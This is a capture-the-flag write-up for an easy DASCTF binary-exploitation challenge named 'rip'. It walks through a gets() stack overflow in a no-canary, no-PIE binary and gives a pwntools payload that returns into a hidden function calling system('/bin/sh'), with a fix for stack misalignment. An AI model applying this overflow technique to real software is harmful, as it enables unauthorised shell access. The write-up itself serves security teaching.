# DASCTF — Pwn: `rip`

**Category:** Pwn (Binary Exploitation)
**Difficulty:** Easy
**Author:** Gantosay
**Flag:** `CTF2{e2c50129-****-****-****-0a9158d3}` 

## TL;DR

A classic stack-based buffer overflow with no canary and no PIE. An unreachable function (`fun`) calls `system("/bin/sh")`. The only non-trivial part is a stack-alignment crash on the target libc, solved by landing one byte into the function to skip its `push rbp` and keep `rsp` 16-byte aligned.

## 1. Reconnaissance

```bash
$ file rip
rip: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

```bash
$ pwn checksec ./rip
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

| Protection | Status | Implication |
|---|---|---|
| Canary | Disabled | No corruption check before `ret` |
| NX | Disabled (stack is RWX) | Shellcode injection is *possible*, but not needed here |
| PIE | Disabled | All addresses are static and can be hardcoded |
| RELRO | Partial | Not the relevant attack surface for this challenge |

With no PIE and no canary, this is about as straightforward as a stack overflow gets — the only question is where the saved return address lives and what's worth returning to.

## 2. Static analysis

```asm
0000000000401142 <main>:
  401142: push   rbp
  401143: mov    rbp, rsp
  401146: sub    rsp, 0x10
  40114a: lea    rdi, [rip+0xeb3]        # 402004: "please input"
  401151: call   puts@plt
  401156: lea    rax, [rbp-0xf]          # buffer address
  40115a: mov    rdi, rax
  401162: call   gets@plt                 # unbounded read — the bug
  401167: lea    rax, [rbp-0xf]
  40116e: call   puts@plt                 # echoes the buffer back
  401173: lea    rdi, [rip+0xe97]        # 402011: "ok,bye!!!"
  40117a: call   puts@plt
  401184: leave
  401185: ret

0000000000401186 <fun>:
  401186: push   rbp
  401187: mov    rbp, rsp
  40118a: lea    rdi, [rip+0xe8a]        # 40201b: "/bin/sh"
  401191: call   system@plt
  401197: pop    rbp
  401198: ret
```

`main` reads into a 15-byte stack buffer (`rbp-0xf`) using `gets()`, which performs no bounds checking whatsoever — the classic CWE-242 pattern. `fun()` is never called from anywhere in the program; it exists purely as a target to jump to. Confirmed via `.rodata` that the string at `0x40201b` is `/bin/sh`:

```bash
$ objdump -s -j .rodata ./rip
402000 01000200 706c6561 73652069 6e707574  ....please input
402010 006f6b2c 62796521 2121002f 62696e2f  .ok,bye!!!./bin/
402020 736800                               sh.
```

## 3. Building the payload

**Offset to the return address:**

```
buffer starts at rbp-0xf  →  15 bytes
+ saved RBP               →  8 bytes
────────────────────────────────────
= 23 bytes of padding before the return address
```

**First attempt — straight jump to `fun` (0x401186):** crashed with SIGSEGV immediately after `fun()` called `system()`.

**Root cause — stack alignment.** Overwriting the return address directly (no real `call` instruction precedes the jump) leaves `rsp` 8 bytes off the 16-byte boundary the x86-64 ABI expects. Some libc routines — `system()` among them — use SSE instructions (`movaps` and similar) that fault on a misaligned stack.

**Fix:** target `0x401186 + 1` instead of the function's true entry point. Landing one byte in skips the `push rbp` instruction, which is exactly the 8-byte stack adjustment that was throwing off the alignment — no separate `ret`-gadget needed.

```python
from pwn import *

backdoor_addr = 0x401186 + 1          # skip push rbp to fix stack alignment
payload = b'A' * 23 + p64(backdoor_addr)
```



## 4. Takeaways

- No-canary + no-PIE + an unreachable "backdoor" function is the simplest possible `ret2win` shape — the interesting part of this challenge isn't finding the bug, it's landing the jump cleanly.
- A direct return-address overwrite often misaligns `rsp` by 8 bytes relative to what the ABI expects. Two equally valid fixes: (a) prepend the address of a bare `ret` gadget to re-align the stack, or (b) jump one byte into the target function to skip its `push rbp` and absorb the same 8 bytes. The second is simpler when the target function's prologue is a plain `push rbp; mov rbp, rsp`.



